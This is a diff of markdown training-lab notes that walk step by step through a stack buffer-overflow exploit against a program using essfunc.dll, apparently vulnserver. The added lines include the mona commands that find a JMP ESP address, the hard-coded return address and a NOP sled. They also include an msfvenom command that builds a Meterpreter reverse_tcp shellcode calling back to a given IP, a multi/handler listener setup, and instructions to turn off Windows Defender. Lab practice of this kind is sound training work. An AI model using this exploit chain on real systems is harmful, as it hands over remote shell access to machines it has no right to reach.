@@ -7,7 +7,7 @@ ________________________________________________________________________________
 _________________________________________________________________________________________________________________
 ### Running the program
 #### Checking the ports to see if the port we identified is listening
-    netstat -antot
+    netstat -anto
 _________________________________________________________________________________________________________________
 ### Using linux to make script
 #### Script is to create socket to connect to the program we identified
@@ -51,40 +51,38 @@ ________________________________________________________________________________
 _________________________________________________________________________________________________________________
 ### Can delete the "BBBB" line, just to ensure it ran properly
 #### Back on the immunitydebugger run the command below in the bottom bar
-    !mona modules
+    !mona modules                            ## To see the fields are vulnerable for the dll
+    !mona jmp -r esp -m "essfunc.dll"        ## To locate the space in memory the dll is at
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Back on immunitydebugger after you run the second command
+#### click on Window in the top and select 2  Log Data
+#### Find the Results select and copy the first line (address) 625012A0
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Back on the script add the address into the script and add the nop sled
+    buf += "\xa0\x12\x50\x62"
+    buf += "\x90" * 15
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Now to create a shellcode for the script
+#### Use your linux IP in the lhost
+    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.21.223 lport=4444 -b "\x00" -f python
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Copy everything after the first buf += b""
+#### and paste below the nop sled line
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Next run msfconsole
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost 0.0.0.0
+    set lport 4444
+    exploit
 _________________________________________________________________________________________________________________
-### 
-#### 
-
-
+### Go back to the windows opstation
+#### Rewind immunitydebugger and run again
+#### Ensure windows defend is turned off
+#### Ensure everything in virus & threat protection settings are off as well
 _________________________________________________________________________________________________________________
-### 
-#### 
+### Make sure you rewind immunitydebugger and run 
+#### Make sure you write to the script then run the script
 
 
 _________________________________________________________________________________________________________________
